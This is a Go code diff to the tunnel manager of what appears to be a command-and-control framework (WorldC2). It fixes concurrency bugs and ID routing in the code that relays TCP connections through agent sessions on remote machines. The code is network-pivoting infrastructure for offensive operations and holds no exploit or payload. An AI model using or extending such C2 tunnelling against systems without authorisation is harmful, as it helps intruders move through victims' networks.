@@ -1,12 +1,15 @@
 package c2
 
 import (
+	"crypto/rand"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
@@ -21,15 +24,17 @@ type TunnelManager struct {
 
 // Tunnel represents an active TCP tunnel through an agent.
 type Tunnel struct {
-	ID        string
-	Session   *session.Session
-	Target    string
-	dataCh    chan []byte
-	closeCh   chan struct{}
-	running   bool
-	mu        sync.Mutex
-	bytesRx   uint64
-	bytesTx   uint64
+	ID      string
+	Session *session.Session
+	Target  string
+	dataCh  chan []byte
+	closeCh chan struct{}
+	running atomic.Bool
+	// chMu guards dataCh/closeCh so HandleTunnelResult can never send on
+	// a channel that Close() is closing concurrently.
+	chMu    sync.Mutex
+	bytesRx uint64
+	bytesTx uint64
 }
 
 // NewTunnelManager creates a tunnel manager.
@@ -39,9 +44,20 @@ func NewTunnelManager() *TunnelManager {
 	}
 }
 
+func newTunnelID() string {
+	b := make([]byte, 8)
+	if _, err := io.ReadFull(rand.Reader, b); err != nil {
+		// Fallback that is still unique enough under concurrency.
+		return fmt.Sprintf("tun-%x-%d", time.Now().UnixNano(), atomic.AddUint64(&tunnelSeq, 1))
+	}
+	return fmt.Sprintf("tun-%x", b)
+}
+
+var tunnelSeq uint64
+
 // OpenTunnel sends a tunnel_open command to the agent and returns a net.Conn.
 func (tm *TunnelManager) OpenTunnel(sess *session.Session, target string) (net.Conn, error) {
-	id := fmt.Sprintf("tun-%x", time.Now().UnixNano())
+	id := newTunnelID()
 
 	t := &Tunnel{
 		ID:      id,
@@ -49,8 +65,8 @@ func (tm *TunnelManager) OpenTunnel(sess *session.Session, target string) (net.C
 		Target:  target,
 		dataCh:  make(chan []byte, 128),
 		closeCh: make(chan struct{}),
-		running: true,
 	}
+	t.running.Store(true)
 
 	tm.mu.Lock()
 	tm.tunnels[id] = t
@@ -72,36 +88,62 @@ func (tm *TunnelManager) OpenTunnel(sess *session.Session, target string) (net.C
 }
 
 // HandleTunnelResult processes an agent's tunnel-related response.
+// Expected wire formats: "tunnel_data:<id>:<base64>" and "tunnel_err:<id>:<msg>".
+// Routing uses the exact tunnel ID (parts[1]) instead of substring matching,
+// which mis-routed data when one ID was a substring of another.
 func (tm *TunnelManager) HandleTunnelResult(result *proto.TaskResult) {
 	output := result.Output
 	if output == "" {
 		return
 	}
 
-	tm.mu.RLock()
-	defer tm.mu.RUnlock()
+	if !strings.HasPrefix(output, "tunnel_data:") && !strings.HasPrefix(output, "tunnel_err:") {
+		return
+	}
 
-	for _, t := range tm.tunnels {
-		if !strings.Contains(output, t.ID) {
-			continue
+	parts := strings.SplitN(output, ":", 3)
+	if len(parts) < 2 {
+		return
+	}
+	id := parts[1]
+
+	tm.mu.RLock()
+	t, ok := tm.tunnels[id]
+	tm.mu.RUnlock()
+	if !ok {
+		return
+	}
+
+	switch {
+	case strings.HasPrefix(output, "tunnel_data:"):
+		if len(parts) != 3 {
+			return
 		}
-		if strings.HasPrefix(output, "tunnel_data:") {
-			parts := strings.SplitN(output, ":", 3)
-			if len(parts) == 3 {
-				data, err := base64.StdEncoding.DecodeString(parts[2])
-				if err == nil && len(data) > 0 {
-					log.Printf("[TUNNEL] Tunnel %s received %d bytes", t.ID, len(data))
-					select {
-					case t.dataCh <- data:
-					default:
-						log.Printf("[TUNNEL] Tunnel %s dataCh full, dropping", t.ID)
-					}
-				}
-			}
-		} else if strings.HasPrefix(output, "tunnel_err:") {
-			tm.Close(t.ID)
+		data, err := base64.StdEncoding.DecodeString(parts[2])
+		if err != nil || len(data) == 0 {
+			return
 		}
-		break
+		log.Printf("[TUNNEL] Tunnel %s received %d bytes", t.ID, len(data))
+		t.chMu.Lock()
+		defer t.chMu.Unlock()
+		if !t.running.Load() {
+			return
+		}
+		select {
+		case t.dataCh <- data:
+		default:
+			log.Printf("[TUNNEL] Tunnel %s dataCh full, dropping", t.ID)
+		}
+
+	case strings.HasPrefix(output, "tunnel_err:"):
+		msg := ""
+		if len(parts) == 3 {
+			msg = parts[2]
+		}
+		log.Printf("[TUNNEL] Tunnel %s error from agent: %s", t.ID, msg)
+		// Close() takes tm.mu.Lock — must be called OUTSIDE the RLock
+		// above or the same goroutine deadlocks (RWMutex is not reentrant).
+		tm.Close(t.ID)
 	}
 }
 
@@ -110,7 +152,7 @@ func (tm *TunnelManager) SendData(tunnelID string, data []byte) error {
 	tm.mu.RLock()
 	t, ok := tm.tunnels[tunnelID]
 	tm.mu.RUnlock()
-	if !ok || !t.running {
+	if !ok || !t.running.Load() {
 		return fmt.Errorf("tunnel not found or closed")
 	}
 
@@ -132,10 +174,24 @@ func (tm *TunnelManager) Close(id string) {
 	}
 	tm.mu.Unlock()
 
-	if ok && t.running {
-		t.running = false
+	if !ok {
+		return
+	}
+
+	t.chMu.Lock()
+	alreadyClosed := !t.running.CompareAndSwap(true, false)
+	if !alreadyClosed {
 		close(t.closeCh)
-		// Send close to agent
+		close(t.dataCh)
+	}
+	t.chMu.Unlock()
+
+	if alreadyClosed {
+		return
+	}
+
+	// Send close to agent (the session may already be gone for orphaned tunnels)
+	if t.Session != nil {
 		cmd := fmt.Sprintf("tunnel_close:%s", id)
 		task := &proto.Task{
 			TaskId:  "tun-close-" + id,
@@ -176,7 +232,7 @@ func (c *tunnelConn) Read(b []byte) (int, error) {
 }
 
 func (c *tunnelConn) Write(b []byte) (int, error) {
-	if !c.tunnel.running {
+	if !c.tunnel.running.Load() {
 		return 0, fmt.Errorf("tunnel closed")
 	}
 	if err := c.tm.SendData(c.tunnel.ID, b); err != nil {
@@ -190,12 +246,13 @@ func (c *tunnelConn) Close() error {
 	return nil
 }
 
-func (c *tunnelConn) LocalAddr() net.Addr  { return addrAny("c2-tunnel") }
-func (c *tunnelConn) RemoteAddr() net.Addr { return addrAny(c.tunnel.Target) }
+func (c *tunnelConn) LocalAddr() net.Addr                { return addrAny("c2-tunnel") }
+func (c *tunnelConn) RemoteAddr() net.Addr               { return addrAny(c.tunnel.Target) }
 func (c *tunnelConn) SetDeadline(t time.Time) error      { return nil }
 func (c *tunnelConn) SetReadDeadline(t time.Time) error  { return nil }
 func (c *tunnelConn) SetWriteDeadline(t time.Time) error { return nil }
 
 type addrAny string
+
 func (a addrAny) Network() string { return "tcp" }
 func (a addrAny) String() string  { return string(a) }
